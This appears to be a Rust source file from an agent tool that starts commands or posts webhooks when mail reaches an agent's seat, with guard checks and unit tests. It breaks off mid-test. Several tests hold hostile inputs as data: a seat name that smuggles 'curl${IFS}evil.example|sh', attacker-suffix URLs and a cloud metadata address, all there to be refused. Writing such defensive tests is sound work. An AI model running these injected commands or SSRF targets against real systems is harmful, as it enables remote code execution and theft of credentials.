//! Wake a seat when mail reaches it.
//!
//! Mail waits in the pack until the recipient's next prompt reads it, and
//! an idle agent has no next prompt. A seat names how to wake it in
//! `wake.toml` beside `harnesses.toml`: a command this machine runs, or a
//! webhook it posts to. `ljos send` and `ljos reply` start that wake in its
//! own session after the message is written, so the sender neither waits
//! on it nor fails with it, and the sender needs to know nothing about the
//! recipient's runner.
//!
//! A command runs as `sh -c` with the recipient's seat in `LJOS_SEAT`, so
//! `ljos inbox` in it reads the recipient's mail. It is judged by the same
//! guard a tool call is, when it is set and again each time it runs, and a
//! `deny` or an `ask` keeps it from running: nobody is there to ask.
//! A webhook gets only the envelope (seat, sender, message id, issue,
//! interrupt), never the body, and its key is read from a file or an
//! environment variable, never from `wake.toml`.
//!
//! A key that ends in `-` is a prefix. Mail to a longer seat that starts
//! with it uses that wake, so a run named `ljosbot-review-` plus its run
//! id wakes the launcher. An exact key wins, and the longest prefix wins
//! when several match. The envelope still names the run's seat and carries
//! the matched prefix as `via`.
//!
//! In push mode the letter is in this machine's pack and not yet on the
//! tracker the other machine reads. The detached wake pushes the sealed
//! log before it runs the command or posts the webhook, so the send
//! itself does not wait. A refused push is a line in the wake log. The
//! wake still runs, and the send still stands.
//!
//! The envelope carries the tracker commit that holds the log, when push
//! mode made one. A command sees `LJOS_WAKE_COMMIT`, and a webhook's JSON
//! has `commit`. The field is absent when no log commit was made. The
//! other machine fetches that commit with `ljos inbox --sync`, imports
//! the sealed logs, and then lists. With no remote the flag only lists.

use std::collections::BTreeMap;
use std::io::Write;
#[cfg(unix)]
use std::os::fd::AsRawFd;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};

/// How long a wake command may run before it is stopped, in seconds.
pub const WAKE_TIMEOUT_SECS: u64 = 30;

/// How long a webhook post may take, in seconds.
const WEBHOOK_TIMEOUT_SECS: u64 = 10;

/// `source` on a wake `ljos cloud up` wrote from `LJOS_WAKE_<SEAT>_URL`.
pub(crate) const ENV_SOURCE: &str = "env";

/// One seat's wake: a command or a webhook.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Wake {
    /// A shell line this machine runs.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    /// A URL this machine posts the envelope to, such as a Grok Bot
    /// routine's webhook.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub webhook: Option<String>,
    /// A file holding the webhook's bearer key.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub key_file: Option<String>,
    /// An environment variable holding the webhook's bearer key.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub key_env: Option<String>,
    /// Seconds before a command is stopped. Absent: [`WAKE_TIMEOUT_SECS`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub timeout: Option<u64>,
    /// Who wrote this entry. [`ENV_SOURCE`] is `ljos cloud up`. Absent means
    /// a person set it, and a later `cloud up` leaves it alone.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source: Option<String>,
}

/// The message a wake is about.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Event {
    pub seat: String,
    pub from: String,
    pub msg: String,
    pub issue: Option<String>,
    pub interrupt: bool,
    /// The tracker commit whose tree holds the sealed log, when push
    /// mode made one. Absent otherwise.
    pub commit: Option<String>,
}

/// Where the wakes are kept: `wake.toml` beside `harnesses.toml`.
#[must_use]
pub fn path() -> PathBuf {
    super::harnesses_path().with_file_name("wake.toml")
}

/// Every seat's wake, keyed by seat or by a prefix (a key ending in `-`).
/// An absent or unreadable file is no wakes.
#[must_use]
pub fn load() -> BTreeMap<String, Wake> {
    std::fs::read_to_string(path())
        .ok()
        .and_then(|text| toml::from_str(&text).ok())
        .unwrap_or_default()
}

#[cfg(test)]
fn load_for_write() -> Result<BTreeMap<String, Wake>> {
    load_path_for_write(&path())
}

fn load_path_for_write(wake_path: &Path) -> Result<BTreeMap<String, Wake>> {
    let text = match std::fs::read_to_string(wake_path) {
        Ok(text) => text,
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(BTreeMap::new()),
        Err(err) => {
            return Err(err).with_context(|| format!("wake: {}", wake_path.display()));
        }
    };
    toml::from_str(&text).with_context(|| format!("wake: parse {}", wake_path.display()))
}

fn render(table: &BTreeMap<String, Wake>) -> Result<String> {
    Ok(format!(
        "# Wakes `ljos send` starts when mail reaches a seat. A name ending in -\n\
         # matches every longer seat that starts with it. `ljos wake --help` sets them.\n{}",
        toml::to_string(table)?
    ))
}

fn lock_path(wake_path: &Path) -> PathBuf {
    let mut name = wake_path
        .file_name()
        .map(|n| n.to_os_string())
        .unwrap_or_else(|| "wake.toml".into());
    name.push(".lock");
    wake_path.with_file_name(name)
}

#[cfg(unix)]
fn lock_exclusive(file: &std::fs::File) -> std::io::Result<()> {
    let rc = unsafe { libc::flock(file.as_raw_fd(), libc::LOCK_EX) };
    if rc == 0 {
        Ok(())
    } else {
        Err(std::io::Error::last_os_error())
    }
}

#[cfg(not(unix))]
fn lock_exclusive(_file: &std::fs::File) -> std::io::Result<()> {
    Ok(())
}

fn save_atomic(wake_path: &Path, table: &BTreeMap<String, Wake>) -> Result<()> {
    let text = render(table)?;
    let dir = wake_path
        .parent()
        .context("wake: no directory for wake.toml")?;
    std::fs::create_dir_all(dir)?;
    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let mut tmp_name = wake_path
        .file_name()
        .map(|n| n.to_os_string())
        .unwrap_or_else(|| "wake.toml".into());
    tmp_name.push(format!(".tmp-{}-{stamp}", std::process::id()));
    let tmp = dir.join(tmp_name);
    {
        let mut out = std::fs::OpenOptions::new()
            .create_new(true)
            .write(true)
            .open(&tmp)
            .with_context(|| format!("wake: {}", tmp.display()))?;
        out.write_all(text.as_bytes())
            .with_context(|| format!("wake: {}", tmp.display()))?;
        out.sync_all()
            .with_context(|| format!("wake: {}", tmp.display()))?;
    }
    if let Err(err) = std::fs::rename(&tmp, wake_path) {
        let _ = std::fs::remove_file(&tmp);
        return Err(err).with_context(|| format!("wake: {}", wake_path.display()));
    }
    Ok(())
}

fn edit_table<T>(edit: impl FnOnce(&mut BTreeMap<String, Wake>) -> Result<(T, bool)>) -> Result<T> {
    let wake_path = path();
    if let Some(dir) = wake_path.parent() {
        std::fs::create_dir_all(dir)?;
    }
    let lock_file_path = lock_path(&wake_path);
    let lock = std::fs::OpenOptions::new()
        .create(true)
        .read(true)
        .write(true)
        .truncate(false)
        .open(&lock_file_path)
        .with_context(|| format!("wake: {}", lock_file_path.display()))?;
    lock_exclusive(&lock).with_context(|| format!("wake: lock {}", lock_file_path.display()))?;
    let mut table = load_path_for_write(&wake_path)?;
    let (out, changed) = edit(&mut table)?;
    if changed {
        save_atomic(&wake_path, &table)?;
    }
    Ok(out)
}

/// The guard's verdict on a wake command: the seat's own guard, the
/// trusted computing base (the static check, which includes the commit,
/// push, and merge gates), then the pack's rules and the ask pack.
/// `None` lets it run.
#[must_use]
pub fn judge(command: &str) -> Option<super::Rule> {
    super::seat_guard(command)
        .or_else(|| super::tcb_verdict(command))
        .or_else(|| super::ruled_verdict(&super::rules_for_gate(), command))
}

fn refusal(command: &str, rule: &super::Rule) -> String {
    format!(
        "the guard says {} on `{command}`: {} (rule: {}). A wake runs with nobody to ask, so it does not run",
        rule.verdict, rule.reason, rule.pattern
    )
}

/// `https`, or `http` whose host is exactly `localhost`, an IPv4 loopback
/// address, or `::1`. The host is parsed, so a name that only begins with
/// one of those (such as `localhost.attacker.invalid`) is not loopback.
pub(crate) fn check_webhook(url: &str) -> Result<()> {
    if !webhook_host_allowed(url) {
        bail!("wake: {url} is not https, nor http on this machine");
    }
    Ok(())
}

fn webhook_host_allowed(url: &str) -> bool {
    let Ok(parsed) = url::Url::parse(url) else {
        return false;
    };
    match parsed.scheme() {
        "https" => parsed.host().is_some(),
        "http" => http_host_is_loopback(parsed.host()),
        _ => false,
    }
}

fn http_host_is_loopback(host: Option<url::Host<&str>>) -> bool {
    match host {
        Some(url::Host::Domain(name)) => name.eq_ignore_ascii_case("localhost"),
        Some(url::Host::Ipv4(addr)) => addr.is_loopback(),
        // `Ipv6Addr::is_loopback` is `::1` only, not an IPv4-mapped address.
        Some(url::Host::Ipv6(addr)) => addr.is_loopback(),
        None => false,
    }
}

/// Set a seat's wake command, after the guard passes it.
///
/// # Errors
///
/// The guard refuses the command, or `wake.toml` cannot be written.
pub fn set_command(seat: &str, command: &str, timeout: Option<u64>) -> Result<String> {
    let command = command.trim();
    if command.is_empty() {
        bail!("wake: empty command");
    }
    if let Some(rule) = judge(command) {
        bail!("wake: {}", refusal(command, &rule));
    }
    let next = Wake {
        command: Some(command.to_string()),
        timeout,
        ..Wake::default()
    };
    edit_table(|table| {
        let changed = table.get(seat) != Some(&next);
        if changed {
            table.insert(seat.to_string(), next.clone());
        }
        Ok(((), changed))
    })?;
    Ok(format!("wake {seat}: runs `{command}` {}\n", reaches(seat)))
}

/// Set a seat's webhook. The key stays in its file or variable.
///
/// # Errors
///
/// The URL is not https, and not http on localhost or a loopback
/// address, or `wake.toml` cannot be written.
pub fn set_webhook(
    seat: &str,
    url: &str,
    key_file: Option<&str>,
    key_env: Option<&str>,
) -> Result<String> {
    let url = url.trim();
    check_webhook(url)?;
    let next = Wake {
        webhook: Some(url.to_string()),
        key_file: key_file.map(str::to_string),
        key_env: key_env.map(str::to_string),
        ..Wake::default()
    };
    edit_table(|table| {
        let changed = table.get(seat) != Some(&next);
        if changed {
            table.insert(seat.to_string(), next.clone());
        }
        Ok(((), changed))
    })?;
    Ok(format!("wake {seat}: posts to {url} {}\n", reaches(seat)))
}

/// Write the webhook `ljos cloud up` owns for `seat`.
///
/// A later run may replace it. [`set_webhook`] leaves `source` empty, so
/// a wake set by hand is not this one.
///
/// # Errors
///
/// The URL is not https, and not http on localhost or a loopback
/// address, or `wake.toml` cannot be written.
pub(crate) fn set_env_webhook(seat: &str, url: &str, key_env: &str) -> Result<bool> {
    let url = url.trim();
    check_webhook(url)?;
    let next = Wake {
        webhook: Some(url.to_string()),
        key_env: Some(key_env.to_string()),
        source: Some(ENV_SOURCE.to_string()),
        ..Wake::default()
    };
    edit_table(|table| {
        let hand_set = table
            .get(seat)
            .is_some_and(|wake| wake.source.as_deref() != Some(ENV_SOURCE));
        if hand_set {
            return Ok((false, false));
        }
        let changed = table.get(seat) != Some(&next);
        if changed {
            table.insert(seat.to_string(), next.clone());
        }
        Ok((true, changed))
    })
}

/// Remove one env-owned wake entry.
///
/// Returns whether an env-owned entry was present and removed.
pub(crate) fn clear_env_webhook(seat: &str) -> Result<bool> {
    edit_table(|table| {
        let remove = table
            .get(seat)
            .is_some_and(|wake| wake.source.as_deref() == Some(ENV_SOURCE));
        if remove {
            table.remove(seat);
        }
        Ok((remove, remove))
    })
}

/// Remove a seat's wake.
///
/// # Errors
///
/// `wake.toml` cannot be written.
pub fn clear(seat: &str) -> Result<String> {
    edit_table(|table| {
        if table.remove(seat).is_none() {
            if let Some((key, _)) = resolve(table, seat) {
                if key != seat {
                    return Ok((
                        format!("wake {seat}: none set; matches {key}. clear {key} to remove it\n"),
                        false,
                    ));
                }
            }
            return Ok((format!("wake {seat}: none set\n"), false));
        }
        Ok((format!("wake {seat}: removed\n"), true))
    })
}

/// What a seat's wake is, in one line. A seat with no entry of its own
/// uses the longest prefix entry, and the line names that prefix.
#[must_use]
pub fn show(seat: &str) -> String {
    let table = load();
    let Some((key, wake)) = resolve(&table, seat) else {
        return none_set(seat);
    };
    let how = if let Some(command) = &wake.command {
        format!("runs `{command}`")
    } else if let Some(url) = &wake.webhook {
        format!("posts to {url}")
    } else {
        return none_set(seat);
    };
    if key != seat {
        format!("wake {seat}: {how} (matches {key})\n")
    } else if is_prefix_key(key) {
        format!("wake {seat}: {how} when mail reaches a seat that starts with it\n")
    } else {
        format!("wake {seat}: {how}\n")
    }
}

fn none_set(seat: &str) -> String {
    format!(
        "wake {seat}: none set, so mail waits for its next prompt. `ljos wake --command CMD` sets one\n"
    )
}

/// How a newly set wake describes the seats it covers.
fn reaches(seat: &str) -> &'static str {
    if is_prefix_key(seat) {
        "when mail reaches a seat that starts with it"
    } else {
        "when mail reaches it"
    }
}

/// A key ending in one `-`, with a name before it, matches every longer
/// seat that starts with that key. `ljosbot-review-` matches
/// `ljosbot-review-abc` and not `ljosbot-reviewer`.
fn is_prefix_key(key: &str) -> bool {
    matches!(key.strip_suffix('-'), Some(stem) if !stem.is_empty() && !stem.ends_with('-'))
}

/// The wake `seat` runs: its own entry, else the longest prefix entry.
fn resolve<'a>(table: &'a BTreeMap<String, Wake>, seat: &str) -> Option<(&'a str, &'a Wake)> {
    if let Some((key, wake)) = table.get_key_value(seat) {
        return Some((key.as_str(), wake));
    }
    // Prefix wakes are only for canonical run seats.
    if super::seat_slug(seat) != seat {
        return None;
    }
    table
        .iter()
        .filter(|(key, _)| {
            is_prefix_key(key) && seat.len() > key.len() && seat.starts_with(key.as_str())
        })
        .max_by_key(|(key, _)| key.len())
        .map(|(key, wake)| (key.as_str(), wake))
}

/// The wake a delivered message runs. A prefix key itself is not a seat.
fn resolve_delivery<'a>(
    table: &'a BTreeMap<String, Wake>,
    seat: &str,
) -> Option<(&'a str, &'a Wake)> {
    let (key, wake) = resolve(table, seat)?;
    (key != seat || !is_prefix_key(key)).then_some((key, wake))
}

fn matched_prefix<'a>(key: &'a str, seat: &str) -> Option<&'a str> {
    (key != seat && is_prefix_key(key)).then_some(key)
}

fn launcher_seat(key: &str) -> &str {
    if is_prefix_key(key) {
        key.strip_suffix('-').unwrap_or(key)
    } else {
        key
    }
}

fn wake_target(seat: &str, key: &str) -> String {
    if let Some(via) = matched_prefix(key, seat) {
        format!("{} via {via} for {seat}", launcher_seat(via))
    } else {
        key.to_string()
    }
}

/// `LJOS_TRACKER_GIT=push`, the mode a cloud seat uses. Commit-only and
/// off leave the log where the sitting's own sync puts it.
fn push_mode() -> bool {
    std::env::var("LJOS_TRACKER_GIT").as_deref() == Ok("push")
}

fn log_path() -> PathBuf {
    std::env::var_os("XDG_STATE_HOME")
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".local/state")))
        .unwrap_or_else(|| PathBuf::from(".local/state"))
        .join("ljos")
        .join("mail")
        .join("wake.log")
}

fn log(line: &str) {
    let path = log_path();
    if let Some(dir) = path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    if let Ok(mut f) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
    {
        let _ = writeln!(f, "{} {line}", super::now_utc());
    }
}

/// The `ljos` a detached wake runs. `LJOS_WAKE_BIN` is the test stand-in.
fn wake_bin() -> Option<String> {
    if let Some(bin) = std::env::var_os("LJOS_WAKE_BIN").filter(|b| !b.is_empty()) {
        return Some(bin.to_string_lossy().into_owned());
    }
    let me = std::env::current_exe().ok();
    let beside = me.as_ref().map(|m| m.with_file_name("ljos"));
    me.filter(|m| m.file_stem().is_some_and(|s| s == "ljos"))
        .or(beside.filter(|p| p.is_file()))
        .or_else(|| which::which("ljos").ok())
        .map(|p| p.display().to_string())
}

/// Start the wake of each recipient that has one, or whose seat matches a
/// prefix entry, each in its own session, and name the seats woken.
/// Nothing here fails the send: a wake that cannot start is a line in the
/// wake log.
#[must_use]
pub fn spawn(events: &[Event]) -> Vec<String> {
    let table = load();
    let mut woken = Vec::new();
    for event in events {
        let Some((key, _)) = resolve_delivery(&table, &event.seat) else {
            continue;
        };
        let Some(bin) = wake_bin() else {
            log(&format!("{}: no ljos to run the wake", event.seat));
            continue;
        };
        let mut args = vec![
            "wake".to_string(),
            event.seat.clone(),
            "--fire".into(),
            "--from".into(),
            event.from.clone(),
            "--msg".into(),
            event.msg.clone(),
        ];
        if let Some(issue) = &event.issue {
            args.push("--issue".into());
            args.push(issue.clone());
        }
        if event.interrupt {
            args.push("--interrupt".into());
        }
        // The detached run writes its outcome to the wake log itself, and
        // what it prints would only repeat it.
        match super::detach(&bin, &args, std::path::Path::new("/dev/null")) {
            Ok(()) => woken.push(wake_target(&event.seat, key)),
            Err(e) => log(&format!("{}: the wake did not start: {e:#}", event.seat)),
        }
    }
    woken
}

/// The envelope a webhook gets. The body stays in the pack. When the
/// log's commit is known, `read` names `ljos inbox --sync COMMIT`.
#[must_use]
pub fn envelope(event: &Event) -> serde_json::Value {
    let seat = crate::tools::sh_quote(&event.seat);
    let read = match &event.commit {
        Some(commit) => format!("LJOS_SEAT={seat} ljos inbox --sync {commit}"),
        None => format!("LJOS_SEAT={seat} ljos inbox"),
    };
    let mut v = serde_json::json!({
        "event": "ljos-mail",
        "seat": event.seat,
        "from": event.from,
        "msg": event.msg,
        "issue": event.issue,
        "interrupt": event.interrupt,
        "read": read,
    });
    if let Some(commit) = &event.commit {
        v["commit"] = serde_json::Value::String(commit.clone());
    }
    v
}

fn webhook_key(wake: &Wake) -> Option<String> {
    let from_file = wake.key_file.as_deref().and_then(|p| {
        let path = p
            .strip_prefix("~/")
            .and_then(|rest| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(rest)))
            .unwrap_or_else(|| PathBuf::from(p));
        std::fs::read_to_string(path).ok()
    });
    from_file
        .or_else(|| wake.key_env.as_deref().and_then(|v| std::env::var(v).ok()))
        .map(|k| k.trim().to_string())
        .filter(|k| !k.is_empty())
}

fn run_command(command: &str, event: &Event, timeout: Duration) -> Result<String> {
    if let Some(rule) = judge(command) {
        bail!("{}", refusal(command, &rule));
    }
    let mut cmd = std::process::Command::new("sh");
    cmd.arg("-c")
        .arg(command)
        .env("LJOS_SEAT", &event.seat)
        .env("LJOS_WAKE_SEAT", &event.seat)
        .env("LJOS_WAKE_FROM", &event.from)
        .env("LJOS_WAKE_MSG", &event.msg)
        .env("LJOS_WAKE_ISSUE", event.issue.as_deref().unwrap_or(""))
        .env(
            "LJOS_WAKE_INTERRUPT",
            if event.interrupt { "1" } else { "0" },
        )
        .stdin(std::process::Stdio::null());
    match &event.commit {
        Some(commit) => {
            cmd.env("LJOS_WAKE_COMMIT", commit);
        }
        None => {
            cmd.env_remove("LJOS_WAKE_COMMIT");
        }
    }
    // What the command prints goes to the wake log, above the line that
    // says how it ended.
    let path = log_path();
    if let Some(dir) = path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    if let Ok(out) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
    {
        if let Ok(err) = out.try_clone() {
            cmd.stdout(out).stderr(err);
        }
    }
    let mut child = cmd.spawn().context("start the wake command")?;
    let started = Instant::now();
    loop {
        if let Some(status) = child.try_wait()? {
            if status.success() {
                return Ok(format!("ran in {} ms", started.elapsed().as_millis()));
            }
            bail!("exited {status}");
        }
        if started.elapsed() >= timeout {
            // The child's own pid, which this process started.
            let _ = child.kill();
            let _ = child.wait();
            bail!("stopped after {} ms", timeout.as_millis());
        }
        std::thread::sleep(Duration::from_millis(20));
    }
}

fn post(url: &str, wake: &Wake, event: &Event, via: Option<&str>) -> Result<String> {
    check_webhook(url)?;
    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_secs(WEBHOOK_TIMEOUT_SECS))
        .redirects(0)
        .build();
    let mut req = agent.post(url).set("Content-Type", "application/json");
    if let Some(key) = webhook_key(wake) {
        req = req.set("Authorization", &format!("Bearer {key}"));
    }
    let started = Instant::now();
    let mut envelope = envelope(event);
    if let Some(via) = via {
        envelope["via"] = serde_json::Value::String(via.to_string());
    }
    let resp = req.send_string(&envelope.to_string()).map_err(|e| {
        anyhow::anyhow!("POST {url}: {}", e.to_string().replace(url, "the webhook"))
    })?;
    if (300..400).contains(&resp.status()) {
        bail!(
            "POST the webhook: refused redirect status {}",
            resp.status()
        );
    }
    Ok(format!(
        "posted, {} in {} ms",
        resp.status(),
        started.elapsed().as_millis()
    ))
}

/// Run one seat's wake now and say what happened. A prefix entry matches
/// a longer seat that starts with it. The outcome is also a line in the
/// wake log, since a detached wake has nobody to tell.
///
/// In push mode the sealed log is pushed first, from this process, which
/// `send` and `reply` have already detached. The other machine can then
/// read the letter. A push that does not land is recorded here and does
/// not stop the wake. The envelope then names the commit that holds the
/// log, including when the push was refused and the commit stayed local.
///
/// # Errors
///
/// The seat has no wake, the guard refuses its command, or the command or
/// the post fails.
pub fn fire(event: &Event) -> Result<String> {
    let table = load();
    let Some((key, wake)) = resolve_delivery(&table, &event.seat) else {
        bail!("wake: {} has no wake set", event.seat);
    };
    let via = matched_prefix(key, &event.seat);
    let named = wake_target(&event.seat, key);
    // The letter is already in the pack. Pushing here, rather than in
    // `send`, keeps the sender's wait to the detach. The other host's
    // inbox stays empty until this push is on the remote. The commit is
    // read after the push, so a refusal still names the local log.
    let mut carried = event.clone();
    if push_mode() {
        if let Err(why) = super::sync::push_sealed_log() {
            log(&format!("{}: {why:#}", carried.seat));
        }
        carried.commit = super::sync::log_commit();
    }
    let outcome = if let Some(command) = &wake.command {
        let timeout = Duration::from_secs(wake.timeout.unwrap_or(WAKE_TIMEOUT_SECS).max(1));
        run_command(command, &carried, timeout)
    } else if let Some(url) = &wake.webhook {
        post(url, wake, &carried, via)
    } else {
        Err(anyhow::anyhow!("neither a command nor a webhook"))
    };
    match outcome {
        Ok(said) => {
            log(&format!("{named} {}: {said}", carried.msg));
            Ok(format!("wake {named}: {said}\n"))
        }
        Err(e) => {
            log(&format!("{named} {}: {e:#}", carried.msg));
            Err(e).context(format!("wake {named}"))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_wake_reads_back_as_written_and_keeps_no_key() {
        let mut table = BTreeMap::new();
        table.insert(
            "grok".to_string(),
            Wake {
                webhook: Some("https://api2.cursor.sh/automations/webhook/abc".into()),
                key_file: Some("~/.config/ljos/grok.key".into()),
                ..Wake::default()
            },
        );
        table.insert(
            "claude-review".to_string(),
            Wake {
                command: Some("claude -p --resume \"$SESSION\" 'ljos inbox'".into()),
                timeout: Some(120),
                ..Wake::default()
            },
        );
        table.insert(
            "ljosbot-review-".to_string(),
            Wake {
                webhook: Some("https://example.test/launch".into()),
                key_env: Some("LJOS_WAKE_LAUNCHER_KEY".into()),
                ..Wake::default()
            },
        );
        let text = toml::to_string(&table).unwrap();
        assert!(!text.contains("key ="), "{text}");
        let back: BTreeMap<String, Wake> = toml::from_str(&text).unwrap();
        assert_eq!(back, table);
    }

    #[test]
    fn a_webhook_gets_the_envelope_and_not_the_body() {
        let event = Event {
            seat: "grok".into(),
            from: "saddle".into(),
            msg: "m1".into(),
            issue: Some("Software-d9n6".into()),
            interrupt: true,
            commit: None,
        };
        let v = envelope(&event);
        assert_eq!(v["seat"], "grok");
        assert_eq!(v["msg"], "m1");
        assert_eq!(v["interrupt"], true);
        assert!(v.get("commit").is_none(), "{v}");
        assert_eq!(v["read"], "LJOS_SEAT='grok' ljos inbox");
        assert!(v.get("body").is_none() && v.get("text").is_none(), "{v}");
        let named = Event {
            commit: Some("0123456789abcdef0123456789abcdef01234567".into()),
            ..event
        };
        let named_v = envelope(&named);
        assert_eq!(
            named_v["commit"],
            "0123456789abcdef0123456789abcdef01234567"
        );
        assert_eq!(
            named_v["read"],
            "LJOS_SEAT='grok' ljos inbox --sync 0123456789abcdef0123456789abcdef01234567"
        );
        assert!(check_webhook("http://example.com/hook").is_err());
        assert!(check_webhook("https://api2.cursor.sh/automations/webhook/x").is_ok());
        assert!(check_webhook("http://127.0.0.1:9/hook").is_ok());
    }

    #[test]
    fn http_is_loopback_only_and_an_attacker_suffix_is_refused() {
        for url in [
            "http://localhost.attacker.invalid/hook",
            "http://127.0.0.1.attacker.invalid/hook",
            "http://localhost@attacker.invalid/hook",
            "http://127.0.0.1@attacker.invalid/hook",
            "http://example.com/hook",
            "http://169.254.169.254/latest/meta-data",
            "http://0.0.0.0/hook",
            "http://[::2]/hook",
        ] {
            assert!(check_webhook(url).is_err(), "{url}");
        }
        for url in [
            "https://api2.cursor.sh/automations/webhook/x",
            "https://localhost.attacker.invalid/hook",
            "http://127.0.0.1:9/hook",
            "http://127.0.0.2/hook",
            "http://2130706433/hook",
            "http://localhost/hook",
            "http://localhost:9/hook",
            "http://[::1]/hook",
            "http://[::1]:9/hook",
            "http://[0:0:0:0:0:0:0:1]/hook",
            "http://user:secret@127.0.0.1/hook",
        ] {
            assert!(check_webhook(url).is_ok(), "{url}");
        }
    }

    #[test]
    fn a_wake_that_runs_past_its_timeout_is_stopped() {
        let event = Event {
            seat: "slow".into(),
            ..Event::default()
        };
        let started = Instant::now();
        let err = run_command("sleep 5", &event, Duration::from_millis(300)).unwrap_err();
        assert!(err.to_string().contains("stopped after"), "{err}");
        assert!(started.elapsed() < Duration::from_secs(3));
        let ok = run_command("test \"$LJOS_SEAT\" = slow", &event, Duration::from_secs(5));
        assert!(ok.is_ok(), "{ok:?}");
    }

    fn hook(url: &str) -> Wake {
        Wake {
            webhook: Some(url.to_string()),
            ..Wake::default()
        }
    }

    fn matched<'a>(table: &'a BTreeMap<String, Wake>, seat: &str) -> Option<&'a str> {
        resolve(table, seat).map(|(key, _)| key)
    }

    #[test]
    fn a_prefix_matches_a_run_and_an_exact_name_wins() {
        let mut table = BTreeMap::new();
        table.insert("inky".into(), hook("https://example.test/inky"));
        table.insert("ljosbot-".into(), hook("https://example.test/ljosbot"));
        table.insert(
            "ljosbot-review-".into(),
            hook("https://example.test/review"),
        );
        table.insert(
            "ljosbot-review-abc".into(),
            hook("https://example.test/exact"),
        );
        table.insert("-".into(), hook("https://example.test/bare"));
        table.insert("--".into(), hook("https://example.test/dashes"));
        table.insert("a--".into(), hook("https://example.test/double"));

        assert!(is_prefix_key("ljosbot-review-"));
        assert!(is_prefix_key("a-"));
        assert!(!is_prefix_key("ljosbot-review"));
        assert!(!is_prefix_key("-"));
        assert!(!is_prefix_key("--"));
        assert!(!is_prefix_key("a--"));

        assert_eq!(matched(&table, "inky"), Some("inky"));
        assert_eq!(
            matched(&table, "ljosbot-review-def"),
            Some("ljosbot-review-")
        );
        assert_eq!(matched(&table, "ljosbot-fix-1"), Some("ljosbot-"));
        // `ljosbot-` is a prefix of this seat too. The review prefix is longer.
        assert_eq!(matched(&table, "ljosbot-reviewer"), Some("ljosbot-"));
        assert_eq!(
            matched(&table, "ljosbot-review-abc"),
            Some("ljosbot-review-abc")
        );
        assert_eq!(matched(&table, "ljosbot"), None);
        assert_eq!(matched(&table, "inky-2"), None);
        assert_eq!(matched(&table, "a-b"), None);
        assert_eq!(matched(&table, "-b"), None);

        let mut review_only = BTreeMap::new();
        review_only.insert(
            "ljosbot-review-".into(),
            hook("https://example.test/review"),
        );
        assert_eq!(
            matched(&review_only, "ljosbot-review-def"),
            Some("ljosbot-review-")
        );
        assert_eq!(
            matched(&review_only, "ljosbot-review-x;curl${IFS}evil.example|sh"),
            None
        );
        assert_eq!(matched(&review_only, "ljosbot-reviewer"), None);
        assert_eq!(matched(&review_only, "ljosbot-review"), None);
        assert_eq!(
            reaches("ljosbot-review-"),
            "when mail reaches a seat that starts with it"
        );
        assert_eq!(reaches("inky"), "when mail reaches it");
    }

    fn read_http(sock: &mut std::net::TcpStream) -> String {
        use std::io::Read;
        sock.set_read_timeout(Some(Duration::from_secs(2))).ok();
        let mut buf = Vec::new();
        let mut tmp = [0u8; 1024];
        loop {
            let n = sock.read(&mut tmp).unwrap_or(0);
            if n == 0 {
                break;
            }
            buf.extend_from_slice(&tmp[..n]);
            if let Some(at) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                let headers = &buf[..at];
                let mut need = 0usize;
                for line in headers.split(|b| *b == b'\n') {
                    let line = std::str::from_utf8(line).unwrap_or("").trim();
                    if let Some(v) = line
                        .split_once(':')
                        .filter(|(k, _)| k.eq_ignore_ascii_case("content-length"))
                        .map(|(_, v)| v.trim())
                    {
                        need = v.parse().unwrap_or(0);
                    }
                }
                if buf.len().saturating_sub(at + 4) >= need {
                    break;
                }
            }
        }
        String::from_utf8_lossy(&buf).into_owned()
    }

    fn serve_one() -> (u16, std::sync::mpsc::Receiver<String>) {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
        let port = listener.local_addr().expect("addr").port();
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let Ok((mut sock, _)) = listener.accept() else {
                return;
            };
            let req = read_http(&mut sock);
            let _ = tx.send(req);
            let _ = std::io::Write::write_all(
                &mut sock,
                b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
            );
        });
        (port, rx)
    }

    #[test]
    fn a_webhook_redirect_is_refused_and_not_followed() {
        let (_lock, _dir) = isolated();
        let (target_port, target_rx) = serve_one();
        let redirect = std::net::TcpListener::bind("127.0.0.1:0").expect("redirect bind");
        let redirect_port = redirect.local_addr().expect("redirect addr").port();
        let (first_tx, first_rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let Ok((mut sock, _)) = redirect.accept() else {
                return;
            };
            let req = read_http(&mut sock);
            let _ = first_tx.send(req);
            let location = format!("http://127.0.0.1:{target_port}/next");
            let reply = format!(
                "HTTP/1.1 302 Found\r\nLocation: {location}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
            );
            let _ = std::io::Write::write_all(&mut sock, reply.as_bytes());
        });
        let hook = format!("http://127.0.0.1:{redirect_port}/hook");
        set_webhook("inky", &hook, None, None).expect("set webhook");
        let err = fire(&Event {
            seat: "inky".into(),
            from: "vm-seat".into(),
            msg: "m1".into(),
            ..Event::default()
        })
        .expect_err("redirected webhook must fail");
        let said = format!("{err:#}");
        assert!(said.contains("302"), "{said}");
